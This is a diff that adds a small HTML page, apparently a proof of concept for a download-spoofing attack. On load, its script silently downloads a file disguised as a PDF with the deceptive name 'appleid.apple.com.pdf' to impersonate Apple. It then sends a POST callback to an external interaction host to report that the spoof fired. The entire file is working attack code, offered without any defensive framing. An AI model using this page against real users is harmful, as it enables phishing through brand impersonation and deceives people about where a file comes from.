@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Processing...</title></head>
+<body>
+<script>
+  setTimeout(() => {
+    const blob = new Blob(["You have been hacked"], { type: "application/pdf" });
+
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "appleid.apple.com.pdf"; // 🧨 deceptive filename
+    a.click();
+
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log", {
+      method: "POST",
+      body: JSON.stringify({ status: "spoof download triggered" }),
+      headers: { "Content-Type": "application/json" }
+    });
+  }, 1000);
+</script>
+</body>
+</html>
